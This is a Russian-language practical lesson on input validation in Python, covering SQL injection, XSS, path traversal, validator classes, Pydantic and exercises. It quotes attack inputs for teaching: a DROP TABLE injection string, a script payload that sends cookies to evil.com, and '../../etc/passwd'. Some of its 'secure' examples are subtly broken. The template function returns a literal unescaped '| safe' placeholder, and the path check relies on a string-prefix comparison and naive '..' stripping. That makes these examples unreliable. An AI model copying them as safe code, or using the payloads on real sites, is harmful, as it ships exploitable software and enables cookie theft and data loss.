# Практическое занятие 56: Валидация входных данных

## Санитизация, проверка данных, защита от инъекций, типовая безопасность

### Цель занятия:
Изучить основы валидации входных данных, освоить техники защиты от инъекций и атак, научиться создавать безопасные приложения.

### Задачи:
1. Понять важность валидации входных данных
2. Освоить техники санитизации
3. Научиться использовать библиотеки валидации
4. Защититься от распространённых атак

### План работы:
1. Важность валидации данных
2. Типы атак через входные данные
3. Валидация и санитизация
4. Использование ORM и параметризованных запросов
5. Type hints и проверка типов
6. Практические задания

---

## 1. Важность валидации данных

Валидация входных данных - это первая линия защиты от атак. Неправильная валидация может привести к серьёзным уязвимостям.

### Последствия отсутствия валидации:

- SQL инъекции
- XSS (Cross-Site Scripting)
- CSRF атаки
- LDAP инъекции
- Command Injection
- Path Traversal

---

## 2. Типы атак через входные данные

### Пример 1: SQL Injection

```python
# УЯЗВИМЫЙ КОД - НЕ ИСПОЛЬЗОВАТЬ!
def get_user_unsafe(username):
    # ОПАСНО! Прямая вставка данных в запрос
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# Злоумышленник может ввести:
# username = "'; DROP TABLE users; --"
# Результат: удаление таблицы users

# БЕЗОПАСНЫЙ КОД
def get_user_safe(username):
    # Использование параметризованного запроса
    query = "SELECT * FROM users WHERE username = %s"
    return db.execute(query, (username,))

# ИЛИ использование ORM
def get_user_orm(username):
    return User.query.filter(User.username == username).first()
```

### Пример 2: XSS (Cross-Site Scripting)

```python
# УЯЗВИМЫЙ КОД - НЕ ИСПОЛЬЗОВАТЬ!
def display_comment_unsafe(comment):
    # ОПАСНО! Прямой вывод без экранирования
    return f"<div class='comment'>{comment}</div>"

# Злоумышленник может отправить:
# comment = "<script>document.location='http://evil.com/?c='+document.cookie</script>"

# БЕЗОПАСНЫЙ КОД
import html

def display_comment_safe(comment):
    # Экранирование HTML
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"

# ИЛИ использование шаблонизатора
from markupsafe import escape as safe_html

def display_comment_template(comment):
    return f"<div class='comment'>{{{{ comment | safe }}}}</div>"  # только если trust
```

---

## 3. Валидация и санитизация

### Пример 3: Комплексная валидация

```python
from dataclasses import dataclass
from typing import Optional, List
import re
import html

@dataclass
class ValidationResult:
    is_valid: bool
    errors: List[str]
    sanitized_value: Optional[str] = None

class InputValidator:
    """Комплексный валидатор входных данных"""
    
    @staticmethod
    def validate_email(email: str) -> ValidationResult:
        errors = []
        
        if not email:
            errors.append("Email is required")
            return ValidationResult(False, errors)
        
        # Проверка формата email
        email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_pattern, email):
            errors.append("Invalid email format")
        
        # Ограничение длины
        if len(email) > 254:
            errors.append("Email is too long")
        
        # Санитизация
        sanitized = email.strip().lower()
        
        return ValidationResult(len(errors) == 0, errors, sanitized)
    
    @staticmethod
    def validate_username(username: str) -> ValidationResult:
        errors = []
        
        if not username:
            errors.append("Username is required")
            return ValidationResult(False, errors)
        
        # Проверка длины
        if len(username) < 3:
            errors.append("Username must be at least 3 characters")
        
        if len(username) > 30:
            errors.append("Username is too long")
        
        # Проверка допустимых символов
        if not re.match(r'^[a-zA-Z0-9_-]+$', username):
            errors.append("Username can only contain letters, numbers, - and _")
        
        # Санитизация
        sanitized = username.strip().lower()
        
        return ValidationResult(len(errors) == 0, errors, sanitized)
    
    @staticmethod
    def validate_password(password: str) -> ValidationResult:
        errors = []
        
        if not password:
            errors.append("Password is required")
            return ValidationResult(False, errors)
        
        # Проверка сложности пароля
        if len(password) < 8:
            errors.append("Password must be at least 8 characters")
        
        if not re.search(r'[A-Z]', password):
            errors.append("Password must contain at least one uppercase letter")
        
        if not re.search(r'[a-z]', password):
            errors.append("Password must contain at least one lowercase letter")
        
        if not re.search(r'\d', password):
            errors.append("Password must contain at least one digit")
        
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Password must contain at least one special character")
        
        return ValidationResult(len(errors) == 0, errors)
    
    @staticmethod
    def validate_phone(phone: str) -> ValidationResult:
        errors = []
        
        if not phone:
            return ValidationResult(True, [], "")  # phone опционально
        
        # Удаление всех символов кроме цифр и +
        sanitized = re.sub(r'[^\d+]', '', phone)
        
        # Проверка что остались только цифры
        if not re.match(r'^\+?\d{10,15}$', sanitized):
            errors.append("Invalid phone number format")
        
        return ValidationResult(len(errors) == 0, errors, sanitized)
    
    @staticmethod
    def validate_url(url: str) -> ValidationResult:
        errors = []
        
        if not url:
            return ValidationResult(True, [], "")  # URL опционально
        
        # Проверка формата URL
        url_pattern = r'^https?://[^\s/$.?#].[^\s]*$'
        if not re.match(url_pattern, url, re.IGNORECASE):
            errors.append("Invalid URL format")
        
        return ValidationResult(len(errors) == 0, errors, url)
    
    @staticmethod
    def sanitize_html(dirty_html: str) -> str:
        """Санитизация HTML с использованием библиотеки"""
        from bleach import clean
        
        allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a', 'p', 'br']
        allowed_attributes = {'a': ['href', 'title']}
        
        return clean(
            dirty_html,
            tags=allowed_tags,
            attributes=allowed_attributes,
            strip=True
        )
    
    @staticmethod
    def sanitize_sql(unsafe_string: str) -> str:
        """Экранирование для SQL"""
        # НЕ ИСПОЛЬЗУЙТЕ ЭТО ВМЕСТО ПАРАМЕТРИЗОВАННЫХ ЗАПРОСОВ!
        # Это для понимания
        return unsafe_string.replace("'", "''")

# Использование валидатора
validator = InputValidator()

result = validator.validate_email("  User@Example.com  ")
print(f"Valid: {result.is_valid}")
print(f"Errors: {result.errors}")
print(f"Sanitized: {result.sanitized_value}")

result = validator.validate_password("weak")
print(f"Valid: {result.is_valid}")
print(f"Errors: {result.errors}")
```

### Пример 4: Pydantic валидация

```python
from pydantic import BaseModel, EmailStr, validator, Field
from typing import Optional
from datetime import datetime

class UserRegistration(BaseModel):
    username: str = Field(..., min_length=3, max_length=30, pattern=r'^[a-zA-Z0-9_-]+$')
    email: EmailStr
    password: str = Field(..., min_length=8)
    phone: Optional[str] = None
    birth_date: Optional[datetime] = None
    
    @validator('password')
    def validate_password_strength(cls, v):
        if not any(c.isupper() for c in v):
            raise ValueError('Password must contain uppercase letter')
        if not any(c.islower() for c in v):
            raise ValueError('Password must contain lowercase letter')
        if not any(c.isdigit() for c in v):
            raise ValueError('Password must contain digit')
        return v
    
    @validator('username', 'email')
    def lowercase_fields(cls, v):
        if isinstance(v, str):
            return v.lower().strip()
        return v
    
    class Config:
        json_schema_extra = {
            "example": {
                "username": "john_doe",
                "email": "john@example.com",
                "password": "SecurePass123!",
                "phone": "+79991234567"
            }
        }

# Использование
try:
    user = UserRegistration(
        username="JohnDoe",
        email="JOHN@EXAMPLE.COM",
        password="SecurePass123!"
    )
    print(user)
except Exception as e:
    print(f"Validation error: {e}")
```

---

## 4. Защита от Path Traversal

### Пример 5: Безопасная работа с файлами

```python
import os
from pathlib import Path
import re

class SafeFileHandler:
    """Безопасная обработка файлов"""
    
    def __init__(self, base_directory: str):
        self.base_directory = Path(base_directory).resolve()
    
    def _validate_path(self, file_path: str) -> Path:
        """Валидация пути к файлу"""
        
        # Удаление всех попыток выхода за пределы директории
        # Заменяем .. на пустую строку
        safe_path = file_path.replace('..', '')
        
        # Создаём полный путь
        full_path = (self.base_directory / safe_path).resolve()
        
        # Проверяем что путь находится в базовой директории
        if not str(full_path).startswith(str(self.base_directory)):
            raise ValueError("Access denied: Path outside allowed directory")
        
        return full_path
    
    def read_file(self, filename: str) -> str:
        """Безопасное чтение файла"""
        try:
            path = self._validate_path(filename)
            
            if not path.exists():
                raise FileNotFoundError(f"File not found: {filename}")
            
            if not path.is_file():
                raise ValueError("Not a file")
            
            return path.read_text(encoding='utf-8')
        
        except (ValueError, FileNotFoundError):
            raise
    
    def list_directory(self, dir_path: str = "") -> list:
        """Безопасное чтение директории"""
        path = self._validate_path(dir_path)
        
        if not path.is_dir():
            raise ValueError("Not a directory")
        
        return [f.name for f in path.iterdir()]

# Использование
handler = SafeFileHandler("/var/www/uploads")

# Безопасные запросы
try:
    content = handler.read_file("documents/report.txt")
except Exception as e:
    print(f"Error: {e}")

# Попытка атаки path traversal - будет отклонена
try:
    content = handler.read_file("../../etc/passwd")
except ValueError as e:
    print(f"Attack blocked: {e}")
```

---

## 5. Практические задания

### Задание 1: Валидация формы регистрации

Создайте валидацию для формы регистрации:
- Имя пользователя (3-30 символов, буквы и цифры)
- Email (правильный формат)
- Пароль (минимум 8 символов, цифры, буквы разных регистров)
- Подтверждение пароля
- Телефон (опционально)

### Задание 2: Защита от SQL инъекций

Создайте безопасные функции для работы с базой данных:
- Параметризованные запросы
- ORM запросы
- Валидация входных данных

### Задание 3: API валидация

Реализуйте валидацию для REST API:
- Pydantic модели
- Кастомные валидаторы
- Сообщения об ошибках

### Задание 4: Санитизация HTML

Создайте систему для безопасного отображения пользовательского контента:
- Разрешённые теги
- Фильтрация атрибутов
- Защита от XSS

### Задание 5: Загрузка файлов

Реализуйте безопасную загрузку файлов:
- Проверка типа файла
- Ограничение размера
- Переименование файлов
- Проверка расширения

---

## Контрольные вопросы:

1. Что такое SQL инъекция и как от неё защититься?
2. Что такое XSS и какие методы защиты вы знаете?
3. Зачем нужна валидация на стороне сервера?
4. Как защититься от path traversal атак?
5. Почему недостаточно только клиентской валидации?

---

## Дополнительные материалы:

- OWASP Input Validation Cheat Sheet
- Pydantic Documentation
- Bleach Documentation
